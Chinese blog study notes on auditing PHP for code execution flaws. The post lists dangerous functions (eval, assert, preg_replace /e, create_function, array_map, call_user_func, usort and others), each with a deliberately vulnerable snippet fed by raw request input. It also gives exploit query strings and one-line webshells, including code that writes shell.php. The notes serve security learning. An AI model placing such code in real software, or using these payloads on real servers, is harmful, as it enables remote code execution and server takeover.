---
title: "[代码审计]PHP篇:代码执行漏洞"
desc: TonyD0g
date: 2022-01-28 21:31:02
tags: 代码审计
toc: true
---
<font size=4 >

<!-- more -->

## 1.漏洞案例:
漏洞形成原因：客户端提交的参数，未经任何过滤，传入可以执行代码的函数，造成代码执行漏洞.

常见函数:
**eval、preg_replace+/e、assert、call_user_func、call_user_func_array、create_function**等函数

漏洞危害：执行代码，写入webshell、控制服务器

简单举例:
```
<?php
//?cmd=phpinfo();
@eval($_GET['cmd']);
?>
```

## 2.常见代码执行函数:
比如:
**eval()、assert()、preg_replace()、create_function(),array_map()、call_user_func()、call_user_func_array()，array_filter，usort，uasort()，文件操作函数、动态函数(a(b))**

**eval()**:

示例代码:
```
<?php eval($_POST[cmd])?>
```

**assert()**:

示例代码:
```
<?php
//?cmd=phpinfo()
assert($_REQUEST[cmd]);
?>
```

**preg_replace()**:

preg_replace(pattern,replacement,subject);
搜索subject中匹配pattern的部分，以replacement进行替换.
preg_replace()函数原本是执行一个正则表达式的搜索和替换，但因为存在危险的/e修饰符，使 preg_replace()将 replacement 参数当作 PHP 代码

示例代码:
```
<?php
@preg_replace("/abc/e",$_REQUEST['cmd'],"abcd");
?>
```

**create_function()**:
create_function主要用来创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给create_function()执行任意命令.
详见:https://paper.seebug.org/94/#_2

示例代码:
```
<?php
//?cmd=phpinfo();
$func =create_function('',$_REQUEST['cmd']);
$func();
?>
```

**array_map()**:        [这个没用过,找时间学习下]
array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致.

示例代码:
```
<?php
//?func=system&cmd=whoami
$func=$_GET['func'];
$cmd=$_GET['cmd'];
$array[0]=$cmd;
$new_array=array_map($func,$array);
//print_r($new_array);
?>
```

**call_user_func()    /   call_user_func_array()**:
call_user_func — 把第一个参数作为回调函数调用,其余参数是回调函数的参数.
call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数.

示例代码:
```
<?php
//?cmd=phpinfo()
@call_user_func(assert,$_GET['cmd']);
?>
<?php
//?cmd=phpinfo()
$cmd=$_GET['cmd'];
$array[0]=$cmd;
call_user_func_array("assert",$array);
?>
```

**array_filter()**:         [这个没用过,找时间学习下]
依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变

参考链接:https://www.cnblogs.com/zhouguowei/p/5035393.html
示例代码:
```
<?php
//?func=system&cmd=whoami
$cmd=$_GET['cmd'];
$array1=array($cmd);
$func =$_GET['func'];
array_filter($array1,$func);
?>
```

**usort()、uasort()**:      [这两个没用过,找时间学习下]

usort() 通过用户自定义的比较函数对数组进行排序。
uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联.

示例代码:
```
php环境>=5.6才能用
<?php usort(...$_GET);?>
利用方式：
test.php?1[]=1-1&1[]=eval($_POST['x'])&2=assert
[POST]:x=phpinfo();
php环境>=<5.6才能用
<?php usort($_GET,'asse'.'rt');?>
利用方式：
test.php?1=1+1&2=eval($_POST[x])
[POST]:x=phpinfo();
```

**文件操作函数**:

file_put_contents() 函数把一个字符串写入文件中。
fputs() 函数写入文件

示例代码:
```
<?php
$test='<?php eval($_POST[cmd]);?>';
file_put_contents('test1.php',$test);
?>
<?php
fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');
?>
```

**动态函数**:

PHP函数直接由字符串拼接
示例代码:
```
<?php
//?a=assert&b=phpinfo()
$_GET['a']($_GET['b']);
?>
```

## 学习来源:
```
公众号Bypass 《PHP代码审计入门笔记》
```
</font>